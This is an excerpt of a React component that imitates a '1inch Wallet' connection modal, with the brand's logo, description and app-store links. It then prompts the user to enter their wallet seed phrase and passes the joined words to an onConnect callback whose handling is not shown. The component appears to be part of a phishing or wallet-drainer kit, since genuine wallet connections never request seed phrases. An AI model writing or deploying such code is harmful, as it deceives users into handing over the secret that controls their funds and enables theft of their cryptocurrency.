...
export default function OneInchWalletModal({ onClose, onConnect, onBack }) {
  ...
  const handleConnect = () => {
    ...
    if (!allValid) return;
    if (onConnect) onConnect('1inch Wallet', seedWords.join(' '));
    if (onClose) onClose();
  };
    ...
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          ...
          <h2 style={{ margin: 0, textAlign: 'center' }}>1inch Wallet</h2>
          ...
          {!showSeedInput ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/1inch-1inch-logo.svg" alt="1inch Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block' }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.5 }}>
                  1inch Wallet is a mobile-first self-custody wallet built for swaps and cross-chain routing. Download the app and use it to swap across supported networks.
                </p>
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20, marginBottom: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Get 1inch Wallet</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://apps.apple.com/app/1inch-defi-crypto-wallet/id1546049391"
                    target="_blank"
            ...
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your 1inch Wallet seed phrase to continue.
              </p>
